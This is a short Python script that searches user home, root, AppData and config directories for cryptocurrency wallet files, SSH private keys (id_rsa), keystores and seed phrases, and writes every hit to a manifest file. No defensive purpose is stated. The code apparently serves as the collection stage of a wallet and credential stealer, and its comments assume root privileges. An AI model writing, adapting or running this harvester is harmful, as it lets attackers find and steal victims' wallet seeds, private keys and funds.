import os
import re
import shutil

# Directories to Search: User folders, browser extension data, appdata.
SEARCH_DIRS = [
    os.path.expanduser("~"),       # User home
    "/root",                       # Root (if priv'd)
    os.path.expanduser("~/AppData/Roaming"),   # Windows wallet locations
    ".config",                     # Linux/Mac configs
]

# Wallet "fingerprints" (filenames, seeds, etc.)
WALLET_PATTERNS = [
    r"wallet\.dat", r"id_rsa", r"keystore", r"UTC--", r"metamask", r"electrum", r"exodus", r"trust", r"ledger", r"trezor",
    r"\b([a-z0-9]{40})\b",                      # ETH addresses
    r"\b(1[a-zA-Z0-9]{25,34})\b",               # BTC addresses
    r"\b(recovery phrase|seed phrase|mnemonic)[^\n]{10,100}"  # Seeds in text
]

OUTPUT_FILE = "crypto_manifest.txt"

def harvest_crypto_artifacts():
    findings = []
    for base in SEARCH_DIRS:
        for root, dirs, files in os.walk(base, topdown=True):
            for f in files:
                joined = os.path.join(root, f)
                for pattern in WALLET_PATTERNS:
                    if re.search(pattern, f, re.IGNORECASE):
                        findings.append(joined)
                # Check for seed phrases in text-like files
                if f.endswith(('.txt', '.md', '.csv', '.log')):
                    try:
                        with open(joined, 'r', errors='ignore') as src:
                            text = src.read()
                            for pattern in WALLET_PATTERNS:
                                if re.search(pattern, text, re.IGNORECASE):
                                    findings.append(f"{joined} (suspected seed/private key)")
                    except Exception:
                        continue
    with open(OUTPUT_FILE, 'w') as o:
        for item in findings:
            o.write(item + '\n')
    print(f"[√] Crypto artifact scan complete. Results saved to: {OUTPUT_FILE}")

if __name__ == "__main__":
    harvest_crypto_artifacts()